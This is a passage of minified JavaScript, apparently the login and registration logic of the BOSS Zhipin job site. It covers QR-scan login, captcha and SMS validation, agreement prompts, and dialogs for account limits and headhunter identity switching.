        i.find(".qrcodeimg-box img").attr("src") && i.find(".qrcodeimg-box img").attr("src", ""),
        "scan" == e && Sign.getRandomkey(t, i, function(e) {
            try {
                _T.sendTracking("scan_randomkey_success_" + JSON.stringify(e))
            } catch (e) {}
            Sign.scanPending(t),
            Sign.scanValid()
        }),
        "miniapp" == e && (Sign.checkIsScanned(i),
        Sign.RegScanValid(i),
        i.find(".qrcodeimg-box img").attr("src", "/wflow/zpgeek/miniapp/" + i.find(".scene").val()));
        var e = "verrify" + Math.random().toString(32).substr(-10, 6)
          , a = t.find(".sign-form:visible").find(".row-code");
        a.attr("id", e),
        a.length && (a.html(""),
        VerrifyCode.reset(a),
        "undefined" != typeof VerifyCodeSDK && new VerifyCodeSDK({
            dom: a[0],
            success: function(e) {
                Sign.VerrifySuccessCallback(e)
            },
            ready: function(e) {
                Sign.VerrifyReadyCallback(e)
            },
            fail: function(e) {
                try {
                    t.find(".sign-form:visible").find("input[name=phone]").val();
                    e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                } catch (e) {}
            },
            delayLoad: !0
        }))
    },
    dropSelect: function(t) {
        t.find(".dropdown-select").each(function() {
            $(this).on("click", function() {
                $(this).hasClass("dropdown-disabled") || ($(this).toggleClass("dropdown-select-open"),
                $(this).closest(".form-row").find(".dropdown-menu").toggleClass("dropdown-menu-open"))
            })
        }),
        t.find(".dropdown-menu").each(function() {
            var e = $(this)
              , t = e.closest(".form-row").find(".dropdown-select")
              , i = (t.find(".text-select"),
            t.find('input[type="hidden"]'));
            e.on("click", "li", function() {
                i.closest("dd").find(".tip-text").remove(),
                e.removeClass("dropdown-menu-open"),
                t.removeClass("dropdown-select-open"),
                $(this).hasClass("no-mainland-china") && ($.toast({
                    type: "warning",
                    content: $(window).width() <= 800 ? "非中国大陆手机号请使用BOSS直聘APP登录/注册" : "非中国大陆手机号请扫码登录"
                }),
                setTimeout(function() {
                    location.href = $(window).width() <= 800 ? "https://app.zhipin.com/" : "/web/user/?mode=app"
                }, 1e3))
            })
        }),
        $(document).on("touchend click", function(e) {
            $(e.target).closest(".dropdown-menu").length || $(e.target).closest(".dropdown-select").length || (t.find(".dropdown-select").removeClass("dropdown-select-open"),
            t.find(".dropdown-menu").removeClass("dropdown-menu-open"))
        })
    },
    getRandomkey: function(i, e, n) {
        var t = null;
        e.find(".ipt-code").length && (el = e.find(".ipt-code"),
        t = e.find(".randomkey")),
        t && "" != t.val() || Sign.randomLoading || (Sign.randomLoading = !0,
        Sign.xhrs.randomKey = $.ajax({
            url: "/wapi/zppassport/captcha/randkey",
            type: "POST",
            dataType: "json",
            data: {
                pk: $("#page_key_name").val()
            },
            success: function(e) {
                Sign.randomLoading = !1;
                var t = e.zpData;
                if (0 == e.code) {
                    i.find(".randomkey").val(t.randKey),
                    i.find(".verifyimg").click(),
                    i.find(".qrcodeimg-box img").attr("src", "/wflow/zpweixin/qrcode/getqrcode?content=" + t.qrId + "&w=200&h=200"),
                    i.find(".uuid").val(t.qrId);
                    try {
                        _T.sendTracking("sign_scan_restart_uuid_" + t.qrId)
                    } catch (e) {}
                    n && n(t)
                }
            },
            error: function() {
                Sign.randomLoading = !1
            }
        }))
    },
    sendAction: function(e) {
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/common.json",
            data: {
                ba: JSON.stringify(e)
            }
        })
    },
    checkForm: function(t, i) {
        var n, e = (t = t).find(".ipt-phone"), a = t.find('input[name="regionCode"]'), o = t.find(".ipt-pwd"), s = t.find(".ipt-sms"), r = t.find("input[name=policy]"), c = (t.find("input[name=policy]"),
        t.find(".row-code")), l = "";
        if (1 == VERRIFYCODETYPE ? l = t.find("input[name=challenge]") : 2 == VERRIFYCODETYPE ? l = t.find("input[name=csessionId]") : 4 == VERRIFYCODETYPE && (l = t.find("input[name=validate]")),
        e.length) {
            if ("" == e.val()) {
                Sign.showError(e, "请填写手机号"),
                e.focus();
                try {
                    _T.sendEvent(e.closest(".sign-form").data("flow") + "_mobile")
                } catch (e) {}
                return !1
            }
            if (/^\D+$/.test(e.val()))
                return e.val(""),
                !1;
            if ("+86" == a.val() && !/^(1[3456789][0-9]{9})$/.test(e.val())) {
                Sign.showError(e, "请正确填写手机号"),
                e.focus();
                try {
                    _T.sendEvent(e.closest(".sign-form").data("flow") + "_mobile")
                } catch (e) {}
                return !1
            }
            if (!/^(\d{6,11})$/.test(e.val())) {
                Sign.showError(e, "请正确填写手机号"),
                e.focus();
                try {
                    _T.sendEvent(e.closest(".sign-form").data("flow") + "_mobile")
                } catch (e) {}
                return !1
            }
            Sign.hideError(e)
        }
        if (o.length) {
            if ("" == o.val())
                return Sign.showError(o, "请填写密码"),
                o.focus(),
                !1;
            Sign.hideError(o)
        }
        if (t.parents(".sign-quick").length && i)
            return t.find(".btn-sms").hasClass("btn-disabled") ? void 0 : (t.find(".form-row-verify").length ? t.find(".form-row-verify").show() : (t.find(".form-row").last().append('<div class="form-row-verify"></div>'),
            n = new VerifyCodeSDK({
                dom: t.find(".form-row-verify")[0],
                success: function(e) {
                    Sign.VerrifySuccessCallback(e),
                    3 != n.type ? setTimeout(function() {
                        Sign.postData(t, i),
                        t.find(".form-row-verify").remove()
                    }, 500) : (t.find(".btn-img").length || t.find(".form-row-verify .picture_box").append('<button class="btn btn-img">确定</button>'),
                    t.off("click", ".btn-img").on("click", ".btn-img", function(e) {
                        e.preventDefault(),
                        t.find('input[name="captcha"]').val(n.getInputValue()),
                        t.find('input[name="captcha"]').val() ? (Sign.postData(t, i),
                        t.find(".form-row-verify").remove()) : $.toast({
                            type: "error",
                            content: "请填写图片验证码"
                        })
                    }))
                },
                ready: function(e) {
                    Sign.VerrifyReadyCallback(e)
                },
                fail: function(e) {
                    try {
                        t.find("input[name=phone]").val();
                        e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                    } catch (e) {}
                }
            })),
            void $(document).off().on("click", function(e) {
                $(e.target).parents().hasClass("form-row-verify") || $(e.target).hasClass("btn-sms") || $(e.target).hasClass("btn-img") || t.find(".form-row-verify").hide()
            }));
        if (3 != VERRIFYCODETYPE) {
            if (!l.length)
                return t.parents(".sign-quick").length ? $.toast({
                    type: "error",
                    content: "请先完成验证"
                }) : Sign.showError(c, "请先完成验证"),
                l.focus(),
                !1;
            if ("" == l.val())
                return t.parents(".sign-quick").length ? $.toast({
                    type: "error",
                    content: "请先完成验证"
                }) : Sign.showError(c, "请先完成验证"),
                l.focus(),
                !1;
            Sign.hideError(l)
        } else if (!t.parents(".sign-quick").length) {
            var a = (l = t.find(".input_code")).val();
            if (!l.length || "" == a)
                return Sign.showError(c, "请填写图片验证码"),
                l.focus(),
                !1;
            t.find("input[name=captcha]").val(a),
            Sign.hideError(l)
        }
        if (s.length && !i) {
            if ("" == s.val())
                return Sign.showError(s, "请填写短信验证码"),
                s.focus(),
                !1;
            if (!s.val().match(/^.{4,6}$/))
                return Sign.showError(s, "请填写正确的短信验证码"),
                s.focus(),
                !1;
            if (s.val().match(/\D+/))
                return Sign.showError(s, "请填写正确的短信验证码"),
                s.val(""),
                s.focus(),
                !1;
            Sign.hideError(s)
        }
        return i || !r.length || r.is(":checked") ? (e = $(window).width() <= 800,
        o = t.find('input[name="purpose"]').val() || 0,
        c = t.parents(".sign-form").hasClass("sign-register"),
        i || e || Sign.realIdentity == o || !Sign.loginGray || !c || Sign.isNewUser ? void Sign.postData(t, i) : ($.dialog({
            title: "",
            content: "<p>是否将身份切为" + (1 == o ? "招聘者" : "求职者") + '</p><span class="warm-tip-message">若APP已登录' + (1 == o ? "求职者" : "招聘者") + "身份，点击【切换】后，<br />APP需要重新登录。</span>",
            closeText: !0,
            confirmText: "切换",
            cancelText: "取消",
            closeLayer: !1,
            wrapClass: "dialog-prop-default change-identity-dialog " + (1 == o ? "identity-boss" : "identity-geek"),
            onOpen: function() {
                try {
                    _T.sendEvent("pc_user_bc_change_dialog")
                } catch (e) {}
            },
            onClose: function(e, t) {
                try {
                    "confirm" != t && _T.sendEvent("pc_user_bc_change", "cancel" == t ? "3" : "4")
                } catch (e) {}
            },
            onConfirm: function(e) {
                try {
                    _T.sendEvent("pc_user_bc_change", 1 == Sign.realIdentity ? "1" : "2")
                } catch (e) {}
                e.remove(),
                t.find('input[name="purpose"]').length || t.append('<input name="purpose" type="hidden" />'),
                t.find('input[name="purpose"]').val(1 == Sign.realIdentity ? 0 : 1),
                Sign.postData(t)
            }
        }),
        !1)) : (t.closest(".sign-form").hasClass("sign-quick") ? $.toast({
            type: "error",
            content: "请阅读并同意《用户协议》《隐私政策》《看准集团平台协议及隐私政策》"
        }) : (a = $.map([{
            name: "《用户协议》",
            url: "https://about.zhipin.com/agreement?id=registerprotocol"
        }, {
            name: "《隐私政策》",
            url: "https://about.zhipin.com/agreement?id=personalinfopro"
        }, {
            name: "《看准集团平台协议及隐私政策》",
            url: "https://about.zhipin.com/agreement?id=numberoneprotocol"
        }], function(e) {
            return '<a href="' + e.url + '" target="_blank" class="text-agreement-link">' + e.name + "</a>"
        }).join(" "),
        $.dialog({
            title: "",
            content: "请阅读并同意" + a,
            cancelText: "拒绝",
            confirmText: "同意",
            wrapClass: "dialog-prop-default",
            onOpen: function() {
                try {
                    Sign.sendAction({
                        action: "active-login-account-agreement-expo"
                    })
                } catch (e) {}
            },
            onConfirm: function(e) {
                e.remove(),
                r.prop("checked", !0);
                try {
                    t.submit()
                } catch (e) {}
            },
            onClose: function(e, t) {
                try {
                    "cancel" == t && Sign.sendAction({
                        action: "active-login-account-agreement-click",
                        p: "0"
                    }),
                    "confirm" == t && Sign.sendAction({
                        action: "active-login-account-agreement-click",
                        p: "1"
                    })
                } catch (e) {}
            }
        })),
        !1)
    },
    postData: function(formEl, isSms) {
        $(".sign-register").length && $(".sign-register").find('input[name="smsType"]').val(7);
        var formEl = formEl, formType = formEl.closest(".sign-form"), btnSms = formEl.find(".btn-sms"), url = formEl.attr("action"), btnEl = formEl.find(".form-btn .btn"), isRegister, isMobile;
        if (isSms) {
            if (btnSms.hasClass("btn-disabled"))
                return;
            url = btnSms.attr("data-url"),
            btnSms.addClass("btn-disabled").html("请稍后")
        } else {
            if (btnEl.hasClass("btn-disabled"))
                return;
            btnEl.addClass("btn-disabled"),
            Sign.setJumpUrl(formEl),
            window.BossZhipinBridge ? (formEl.find('input[name="environment"]').length || formEl.append('<input name="environment" type="hidden" />'),
            formEl.find('input[name="environment"]').val("BossZhipinBridge")) : $(".page-sign").length && (formEl.find('input[name="environment"]').length || formEl.append('<input name="environment" type="hidden" />'),
            isRegister = formEl.parents(".sign-form").hasClass("sign-register"),
            isMobile = $(window).width() < 800,
            formEl.find('input[name="environment"]').val(isRegister && !isMobile ? "BossLoginIndex" : "BossToLogin"))
        }
        var loginSource = getQueryString("loginSource"), parserChannel = (loginSource && (formEl.find('input[name="loginSource"]').length || formEl.append('<input name="loginSource" type="hidden" />'),
        formEl.find('input[name="loginSource"]').val(loginSource)),
        ""), jumpUrl = getQueryString("jumpUrl") || "", parserResult, parserChannel, channel = (jumpUrl && (parserResult = jumpUrl.match(new RegExp("(^|&)channel=([^&]*)(&|$)")),
        parserChannel = parserResult ? parserResult[2] : ""),
        getQueryString("channel") || parserChannel), dataStr = (channel && (formEl.find('input[name="channel"]').length || formEl.append('<input name="channel" type="hidden" />'),
        formEl.find('input[name="channel"]').val(channel)),
        formEl.serialize());
        $.ajax({
            url: url,
            type: "post",
            dataType: "json",
            data: dataStr,
            success: function(result) {
                var result = result;
                "string" == typeof result && (result = eval("(" + result + ")")),
                result.zpData ? Sign.dealSignResult(formEl, formType, btnSms, btnEl, isSms, result) : Sign.dealSignResultOld(formEl, formType, btnSms, btnEl, isSms, result)
            },
            error: function(e) {
                Sign.showError(formEl, "服务器错误，请稍后再试", !0),
                (isSms ? btnSms.html("发送验证码") : btnEl).removeClass("btn-disabled")
            }
        })
    },
    dealSignResult: function(t, e, i, n, a, o) {
        var s, r = o.zpData, c = "/registe/headhunter/save.json" == t.attr("action") || "/registe/save.json" == t.attr("action") || "/wapi/zppassport/user/registered" == t.attr("action");
        if ((0 != o.code && 6 != o.code || 2 == r.type && c || 4 == r.type) && (VerrifyCode.reset(t.find(".row-code")),
        t.find(".row-code").is(":visible") && (t.find(".row-code").html(""),
        new VerifyCodeSDK({
            dom: t.find(".row-code")[0],
            success: function(e) {
                Sign.VerrifySuccessCallback(e)
            },
            ready: function(e) {
                Sign.VerrifyReadyCallback(e)
            },
            fail: function(e) {
                try {
                    t.find("input[name=phone]").val();
                    e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                } catch (e) {}
            }
        }))),
        0 == o.code) {
            if (!a) {
                try {
                    var l = getQueryObject();
                    1 == l.reportAdParams && (l.register = r.register,
                    $.ajax({
                        type: "get",
                        url: "/wapi/zppassport/report/adParams",
                        data: l || {},
                        dataType: "json"
                    }))
                } catch (e) {}
                try {
                    var d = ".zhipin.com";
                    -1 < window.location.host.indexOf(".weizhipin.com") && (d = ".weizhipin.com"),
                    1 == r.register && $.cookie("register_unique_flag_" + (r.userId || ""), r.register, {
                        domain: d,
                        path: "/"
                    })
                } catch (e) {}
            }
            if (a && (Sign.realIdentity = r.identity,
            Sign.isNewUser = 1 == r.user),
            e.hasClass("sign-pwd") && Sign.callbackPwd(t, r),
            e.hasClass("sign-sms"))
                if (a)
                    if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    4 == r.errorType) {
                        Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                        try {
                            _T.sendEvent("signin_sms_send_lot")
                        } catch (e) {}
                    } else
                        try {
                            _T.sendEvent("signin_sms_send_sms")
                        } catch (e) {}
                else
                    Sign.callbackSms(t, r);
            if (e.hasClass("sign-register"))
                if (a) {
                    i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    t.append('<input type="hidden" name="rescode" value="1" />');
                    try {
                        _T.sendEvent("signin_register_send_sms")
                    } catch (e) {}
                } else
                    "function" == typeof _PAGE.RegisterCallback ? _PAGE.RegisterCallback() : QuickSign.callbackRegister(t, r);
            if (e.hasClass("sign-bind-wechat-signin"))
                if (a)
                    if (2 == r.type)
                        if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                        Sign.countDown(i, function() {
                            i.html("发送验证码").removeClass("count-down btn-disabled")
                        }),
                        i.parent().find(".ipt-sms").focus(),
                        4 == r.errorType) {
                            Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                            try {
                                _T.sendEvent("signin_sms_send_lot")
                            } catch (e) {}
                        } else
                            try {
                                _T.sendEvent("signin_sms_send_sms")
                            } catch (e) {}
                    else
                        Sign.showError(t, o.message, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                else
                    Sign.callbackWechatBind(t, r);
            if (e.hasClass("sign-bind-wechat-signup"))
                if (a)
                    if (2 == r.type)
                        Sign.showError(t, o.message, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                    else {
                        i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                        Sign.countDown(i, function() {
                            i.html("发送验证码").removeClass("count-down btn-disabled")
                        }),
                        i.parent().find(".ipt-sms").focus();
                        try {
                            _T.sendEvent("signin_register_send_sms")
                        } catch (e) {}
                    }
                else
                    Sign.callbackWechatBindRegister(t, r);
            if (e.hasClass("sign-resume"))
                if (a)
                    if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    4 == r.errorType) {
                        Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                        try {
                            _T.sendEvent("signin_sms_send_lot")
                        } catch (e) {}
                    } else
                        try {
                            _T.sendEvent("signin_sms_send_sms")
                        } catch (e) {}
                else
                    AnalysisResume.signOrRegisterCallback(t, r);
            if (e.hasClass("sign-quick"))
                if (a)
                    if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    t.append('<input type="hidden" name="rescode" value="1" />'),
                    4 == r.errorType) {
                        Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                        try {
                            _T.sendEvent("signin_sms_send_lot")
                        } catch (e) {}
                    } else
                        try {
                            _T.sendEvent("signin_sms_send_sms")
                        } catch (e) {}
                else
                    QuickSign.callbackRegister(t, r);
            if (!a)
                try {
                    Sign.enterLoginPageTime && _T.sendEvent("login-flow-done-time", ((new Date).getTime() - Sign.enterLoginPageTime) / 1e3 + "")
                } catch (e) {}
        } else
            4545 == o.code ? (Sign.showError(t, o.message, !0),
            i.html("发送验证码").removeClass("btn-disabled")) : -1 < Sign.loginLimitCode.indexOf(o.code) || 4942 <= o.code && o.code <= 4950 ? Sign.loginLimitTip(o.code, {
                message: o.message,
                closeCallback: function() {
                    window.location.reload()
                }
            }) : 4931 == o.code ? ($.toast({
                type: "error",
                content: o.message || "请使用BOSS直聘APP扫码登录"
            }),
            s = setTimeout(function() {
                location.href = "/web/user/?mode=app",
                clearTimeout(s)
            }, 2e3)) : 400122 == o.code ? location.href = o.message || "/" : Sign.dealSignFail(t, i, a, o);
        a || n.removeClass("btn-disabled")
    },
    loginLimitTip: function(e, t) {
        t = t || {};
        var i, n = "<p>您好，您的账号尚未开启PC端登录权限，请先在BOSS直聘APP内进行招聘，待熟悉使用流程后，系统会根据您的招聘信用，评估您的账号是否可以开启PC端权限。</p>";
        4563 == e && (n += "<p>如果您想快速开启PC端登录，可在BOSS直聘APP首页按提示完成操作，即可开启。</p>"),
        4918 == e && (n = "<p>您好，由于您上次登录行为存在异常，为了您的账号安全，暂为您关闭 PC端登录权限，请先在 BOSS直聘APP 中进行招聘。</p>" + ((i = t.message || "") ? "<p>预计开启时间：" + i + "</p>" : "")),
        4930 == e && (n = '<p>您好，为了更好地保障使用体验和账号安全，请使用PC客户端进行招聘（<a href="https://www.zhipin.com/desktop/?source=4" class="text-primary" target="_blank">点击这里下载</a>）</p>'),
        5004 == e && (n = '<p>您好，经系统检测您的账号存在使用第三方插件的情况，严重违反平台规则。根据《BOSS直聘职位信息发布规则》，我们将暂时限制您通过PC端登录账号，<span class="text-danger">限制到期解除后请确保关闭插件后再登录使用</span>。在此期间，您可在BOSS直聘APP端登录进行招聘。</p>' + (t.message ? "<p>预计开启时间：" + t.message + "</p>" : "")),
        4942 <= e && e <= 4950 && (n = t.message || ""),
        $.dialog({
            title: "",
            content: '            <div class="limit-content">                <div class="title">                    <h4>欢迎您使用BOSS直聘</h4>                </div>                <div class="content">' + n + "</div>            </div>            ",
            closeText: !0,
            cancelText: !1,
            confirmText: "好的",
            wrapClass: "dialog-prop-default limit-boss-dialog",
            onClose: function() {
                t.closeCallback && t.closeCallback()
            }
        })
    },
    toScanLogin: function() {
        $.dialog({
            title: "提示",
            content: "为了您的账号安全，本次登录需要APP扫码登录",
            closeText: !0,
            cancelText: "",
            confirmText: "去扫码",
            wrapClass: "dialog-prop-default pop-sign-wechat",
            onConfirm: function(e) {
                e.remove(),
                Sign.action({
                    action: "user-sao-safety-click"
                }),
                $(".semwrap7").length ? ("none" == $(".pop-sign-wrap").css("display") && $(".show-pop-sign").click(),
                Sign.showPannel($(".pop-sign"), "scan")) : ($(".sign-form ").hide(),
                $(".sign-scan").show(),
                $(".sign-tab .link-scan").click())
            }
        })
    },
    action: function(e) {
        e = $.extend({}, e);
        $.ajax({
            method: "post",
            url: "/wapi/zpCommon/actionLog/common.json",
            data: {
                ba: JSON.stringify(e)
            },
            cache: !1,
            success: function(e) {},
            error: function() {}
        })
    },
    dealSignFail: function(e, t, i, n) {
        var a, o, s = n.zpData || {};
        if (0 == n.code) {
            var r = {
                content: n.message,
                confirmButton: "知道了",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                }
            };
            Sign.showConfirm(r),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click()
        } else if (7 == n.code || 8 == n.code) {
            if (7 == n.code && 2 == s.bizcode)
                var r = {
                    content: '<div class="sign-hunter-gray">如果您是猎头，请请拨打客服电话：400-0655-799进行申诉。同事已经注册成功Boss直聘猎头版，请将TA的手机号提供给客服。</div>',
                    title: "此账号在BOSS直聘被多次举报，暂不支持使用",
                    confirmButton: "知道了",
                    columnClass: "pop-sign-hunter"
                };
            else if (7 == n.code && 3 == n.bizcode)
                var r = {
                    content: '<p>您当前身份为BOSS，是否切换为猎头？</p><ul class="pop-content"><li>为牛人服务，严禁猎头冒充BOSS</li><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li>猎头身份生效后，您不能以BOSS身份登录APP</li><li>您的BOSS直聘账户中有<span class="orange">退款' + n.balance + "元</span>，切换为猎头身份后，可以到BOSS直聘微信公众号中提现</li></ul>",
                    title: "您将要切换为猎头身份",
                    cancelButton: "取消",
                    confirmButton: "切换为猎头",
                    columnClass: "pop-sign-hunter",
                    openCallback: function(e) {
                        e.$confirmButton.parent().css("text-align", "center")
                    },
                    confirmCallback: function() {
                        window.location.href = "/user/transto/headhunter.html?token=" + n.token
                    },
                    cancelCallback: function() {
                        window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                    }
                };
            else if (7 != n.code || 3 != s.bizcode && 4 != s.bizcode)
                if (7 != n.code || 6 != s.bizcode && 8 != s.bizcode)
                    if (7 == n.code && 5 == s.bizcode)
                        r = {
                            content: '<div class="sign-hunter-gray">如果您是猎头，请请拨打客服电话：400-0655-799进行申诉。同事已经注册成功Boss直聘猎头版，请将TA的手机号提供给客服。</div>',
                            title: "此账号在BOSS直聘被多次举报，暂不支持使用",
                            confirmButton: "知道了",
                            columnClass: "pop-sign-hunter"
                        };
                    else if (7 == n.code && 11 == s.bizcode) {
                        try {
                            _T.sendEvent("hunter_account_freeze")
                        } catch (e) {}
                        r = {
                            content: '<div class="sign-hunter-gray">由于您的账号涉及违规，暂不支持使用。</div>',
                            title: "账号锁定",
                            confirmButton: "知道了",
                            columnClass: "pop-sign-hunter"
                        }
                    } else if (7 == n.code && 12 == s.bizcode) {
                        try {
                            _T.sendEvent("hunter_account_locked")
                        } catch (e) {}
                        r = {
                            content: '<div class="sign-hunter-gray">                            <i class="icon-fail"></i>                            <div class="freeze-container"><p class="reject-title">非常抱歉，您的账号已被冻结</p>                            <p class="reject-reason">' + n.message + '</p>                            <p>您可以通过以下方式申诉</p>                            <div class="reject-content">                            请使用邮箱：' + s.userEmail + "<br />发送邮件至boss@kanzhun.com<br />                            邮件标题格式：冻结申诉+您的注册手机号<br />                            邮件内容请填写您的公司全称和其他申诉内容                            </div></div>                            </div>",
                            title: "",
                            closeIcon: !0,
                            confirmButton: "知道了",
                            columnClass: "pop-sign-hunter sign-freeze"
                        }
                    } else
                        r = {
                            content: n.message,
                            confirmButton: "知道了",
                            openCallback: function(e) {
                                e.$confirmButton.parent().css("text-align", "center")
                            }
                        };
                else
                    var r = {
                        content: '<div class="sign-hunter-gray">您的BOSS直聘账户中有未使用的道具、未消耗的直豆，切换为猎头身份后将无法使用。<br />\t\t\t\t\t\t\t请先登录APP将付费产品消耗、直豆消耗，再重新登录猎头端。</div>',
                        title: "请您先清空付费产品",
                        confirmButton: "知道了",
                        columnClass: "pop-sign-hunter"
                    };
            else
                var r = {
                    content: '<div class="sign-hunter-gray">您的BOSS直聘账户中有未使用的道具、未消耗的直豆，切换为猎头身份后将无法使用。<br />\t\t\t\t\t\t\t请先登录APP将付费产品消耗、直豆消耗，再重新登录猎头端。</div>',
                    title: "请您先清空付费产品",
                    confirmButton: "知道了",
                    columnClass: "pop-sign-hunter"
                };
            Sign.showConfirm(r),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click()
        } else if (9 == n.code)
            1 == s.bizcode || 0 == s.bizcode ? Sign.showConfirm(r = {
                content: '<p>您当前身份为BOSS，是否切换为猎头？</p><ul class="pop-content"><li>为牛人服务，严禁猎头冒充BOSS</li><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li>猎头身份生效后，您不能以BOSS身份登录APP</li></ul>',
                title: "您将要切换为猎头身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + s.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            }) : 7 == s.bizcode ? Sign.showConfirm(r = {
                content: '<p>您当前系统身份为牛人，是否切换为猎头？</p><ul class="pop-content"><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li>猎头身份生效后，您不能以牛人身份登录APP</li></ul>',
                title: "您将要切换为猎头身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + s.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            }) : 6 == s.bizcode || 8 == s.bizcode ? (r = {
                content: '<p>您已注册过BOSS直聘，是否切换为猎头身份？</p><ul class="pop-content"><li>为牛人服务，严禁猎头冒充BOSS</li><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li class="bold">您的BOSS直聘账户中剩余' + s.beancount + "个直豆，切换为猎头身份后无法使用。但直豆仍会保留。</li><li>猎头身份生效后，您不能以牛人或BOSS身份登录APP</li></ul>",
                title: "您将要切换为猎头身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + s.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            },
            Sign.showConfirm(r)) : -1 == n.code ? Sign.showError(e, n.message) : Sign.showConfirm(r = {
                content: '<p>您当前身份为BOSS，请选择是否将身份切换为猎头</p><ul class="pop-content"><li>选择猎头身份后，您将以猎头身份发布职位、搜索查看\t简历、更高效的联系牛人</li><li>猎头身份与BOSS身份只可选择一个，选择猎头身份后，不能再以Boss身份登录</li></ul>',
                title: "选择身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + s.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click();
        else if (6 == n.code)
            Sign.showError(e, "短信验证码错误", !0);
        else if (10002 == n.code)
            $.dialog({
                title: "",
                content: '<div style="padding: 4px 0 30px;">请切换至牛人身份，再重新尝试</div>',
                type: "error",
                closeText: !0,
                confirmText: "确定",
                cancelText: !1,
                preKa: "",
                wrapClass: "dialog-icons-default",
                lock: !0
            });
        else if (10004 == n.code)
            $.dialog({
                title: "",
                content: '<div style="padding: 4px 0 30px;">您的简历信息已完善，直接去登录即可 </div>',
                type: "error",
                closeText: !0,
                confirmText: "确定",
                cancelText: !1,
                preKa: "",
                wrapClass: "dialog-icons-default",
                lock: !0
            });
        else if (400023 == n.code)
            UserCheck.checkPhone("/login/phone.json", null, e.find("input[name=account]").val(), e.find("input[name=regionCode]").val());
        else if (400046 == n.code)
            $.dialog({
                title: "绑定失败",
                content: "您当前使用的微信号已绑定过BOSS直聘账号，请登录其他微信号再重试",
                closeText: !0,
                cancelText: "",
                confirmText: "知道了",
                wrapClass: "dialog-prop-default pop-sign-wechat",
                onConfirm: function(e) {
                    e.remove()
                }
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click();
        else if (400041 == n.code)
            $.dialog({
                title: "绑定失败",
                content: "当前BOSS直聘账号已绑定过微信，可直接使用关联的微信扫码登录",
                closeText: !0,
                cancelText: "",
                confirmText: "知道了",
                wrapClass: "dialog-prop-default pop-sign-wechat",
                onConfirm: function(e) {
                    e.remove()
                }
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click();
        else if (4562 == n.code)
            $.dialog({
                title: "提示",
                content: n.message || "非常抱歉，该账号绑定的手机号归属地区暂时无法使用招聘服务。您可以选择切换牛人身份，使用求职服务",
                closeText: !0,
                type: "warning",
                cancelText: !1,
                confirmText: "好的",
                wrapClass: "dialog-prop-default"
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val("");
